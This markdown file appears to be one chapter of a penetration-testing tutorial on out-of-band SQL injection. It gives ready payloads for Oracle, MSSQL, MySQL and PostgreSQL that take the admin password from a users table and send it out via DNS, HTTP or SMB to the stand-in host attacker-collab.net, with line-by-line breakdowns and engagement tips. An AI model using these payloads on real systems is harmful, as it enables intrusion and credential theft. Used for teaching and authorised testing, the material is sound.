# Out-of-Band (OOB) SQL Injection

## 1. When To Reach For OOB

Used when in-band and blind channels are both dead ends — e.g., query timeouts are capped
server-side (killing time-based delays), responses are fully generic, and no errors leak. The
database is instead made to initiate an *outbound* connection (DNS lookup or HTTP request) to
a server you control, carrying exfiltrated data as part of the request itself (e.g., as a
subdomain label or URL path).

This requires the target host to have outbound network access — common in internal/corporate
environments, less so in heavily egress-filtered cloud environments. Always check for this
constraint before investing time here.

## 2. Setting Up A Listener

Before sending any payload, stand up something to receive the callback:
- **Burp Collaborator** (built into Burp Suite Pro) — generates a unique subdomain and logs
  every DNS/HTTP interaction against it. The standard tool for this on engagements.
- Self-hosted alternative: a VPS running `tcpdump` on port 53/80, with an authoritative DNS
  delegation pointed at it (more setup, used when Collaborator access isn't available).

## 3. Oracle — `UTL_HTTP` / `UTL_INADDR` (Classic OOB Vector)

```sql
SELECT UTL_INADDR.get_host_address(
  (SELECT password FROM users WHERE username='admin') || '.attacker-collab.net'
) FROM dual
```

Breakdown:
- `UTL_INADDR.get_host_address(hostname)` — an Oracle built-in package function meant to
  resolve a hostname to an IP address; calling it forces Oracle to perform an actual DNS
  lookup for whatever string you give it.
- `(SELECT password FROM users WHERE username='admin')` — the subquery whose result we want
  exfiltrated; selected as a scalar (single row/column) since it's being concatenated into a
  hostname string.
- `|| '.attacker-collab.net'` — Oracle's string concatenation operator, appending your
  listener's domain so the full string becomes a resolvable-looking subdomain, e.g.
  `Secr3tPass.attacker-collab.net`. When Oracle resolves this, the DNS query for that exact
  subdomain hits your listener, and the password value is visible in the listener's logs as
  the subdomain label.
- `FROM dual` — required dummy table syntax for a scalar `SELECT`, as covered in file 02.

Full injectable version (inside a vulnerable parameter):

```sql
' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='admin')||'.attacker-collab.net')) FROM dual)--
```

Breakdown: identical mechanism to above, wrapped as a boolean-style injection (`AND 1=(...)`)
so it fits into an existing `WHERE` clause without needing a UNION-compatible column count.

### 3.1 Oracle — `UTL_HTTP` (HTTP-based exfil, when DNS egress is blocked)

```sql
SELECT UTL_HTTP.request('http://attacker-collab.net/' || (SELECT password FROM users WHERE username='admin')) FROM dual
```

Breakdown:
- `UTL_HTTP.request(url)` — Oracle built-in that issues an outbound HTTP GET to the given URL
  and returns the response body (which we don't care about — the side effect, the outbound
  request itself, is the exfil channel).
- The exfiltrated value is appended as a URL **path** segment instead of a DNS label, useful
  when port 53 is blocked outbound but 80/443 is permitted — your listener just needs to log
  incoming HTTP requests and parse the path.

## 4. MSSQL — `xp_dirtree` / `xp_fileexist` (SMB-based DNS Trigger)

```sql
'; EXEC master..xp_dirtree '\\' + (SELECT password FROM users WHERE username='admin') + '.attacker-collab.net\share'--
```

Breakdown:
- `;` — stacked query separator (MSSQL allows a second statement after the original; see file
  08 for full coverage).
- `EXEC master..xp_dirtree path` — an extended stored procedure intended to list the contents
  of an SMB share at the given UNC path. Calling it with a UNC path causes the underlying OS
  to perform a DNS resolution for the hostname portion before even attempting the SMB
  connection — that resolution is what we're hijacking.
- `'\\' + ... + '.attacker-collab.net\share'` — builds a UNC path (`\\hostname\share`) where
  the hostname segment is the data we want leaked, concatenated using MSSQL's `+` string
  operator (per file 01's DBMS syntax table). The actual SMB connection itself will fail (no
  real share exists) — that's fine, the DNS lookup already happened and was logged.

`xp_fileexist` works identically as an alternative trigger:

```sql
'; EXEC master..xp_fileexist '\\' + (SELECT password FROM users WHERE username='admin') + '.attacker-collab.net\file.txt'--
```

Breakdown: same UNC-path DNS-trigger mechanism as `xp_dirtree`, using a different stored
procedure as the trigger in case `xp_dirtree` is disabled/restricted on the target instance.

## 5. MySQL — Limited Native OOB, Use `LOAD_FILE` Against UNC Paths (Windows Hosts Only)

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker-collab.net\\share'))
```

Breakdown:
- `LOAD_FILE(path)` — MySQL function that reads a file from disk (or a UNC network path, on
  Windows hosts where this is enabled) and returns its contents.
- `\\\\` — four backslashes in the SQL string literal because each `\` needs escaping once in
  the SQL string syntax, resolving to the two literal backslashes (`\\`) needed to start a
  UNC path.
- This only works when MySQL is running on a Windows host with `secure_file_priv` not
  restricting network paths — far less reliable than Oracle/MSSQL OOB primitives, so treat
  this as a secondary option, not a primary technique for MySQL targets.

## 6. PostgreSQL — `COPY ... TO PROGRAM` / `dblink` (Requires Elevated Privileges)

```sql
SELECT dblink_connect('host=attacker-collab.net dbname=' || (SELECT password FROM users WHERE username='admin'));
```

Breakdown:
- `dblink_connect(connstr)` — `dblink` is a PostgreSQL extension enabling outbound connections
  to other Postgres servers; calling `connect` forces an actual network connection attempt to
  the host you specify.
- `'host=attacker-collab.net dbname=' || (subquery)` — builds a libpq connection string where
  the `dbname` parameter carries the exfiltrated value; even though no real database with that
  name exists, the connection attempt itself (and any DNS resolution prior to it) is logged.
- Requires the `dblink` extension installed and superuser/elevated grants — common on internal
  data-warehouse-style Postgres instances, rare on hardened public-facing app databases.

## 7. Real-World Notes

- **Common mistake:** Forgetting to confirm outbound network access *before* spending time
  crafting OOB payloads — if the host is in an egress-filtered environment (common in PCI/
  regulated environments), this entire technique class is a dead end; pivot back to blind
  with longer timeouts instead.
- **Engagement reality:** OOB SQLi is most valuable for *confirmation in zero-feedback
  scenarios* (e.g., when an app fully swallows errors and runs all queries async) — not
  necessarily for full data extraction, which is slow over DNS (label length limits force
  chunking long values across multiple lookups).
- **Report-writing tip:** Screenshot/log the Burp Collaborator interaction log directly — for
  OOB findings, the DNS/HTTP callback log *is* your primary evidence, since there's nothing
  visible in the original HTTP response to screenshot.

## Next File
→ `05-second-order-sqli.md` — Stored/second-order SQLi chains.
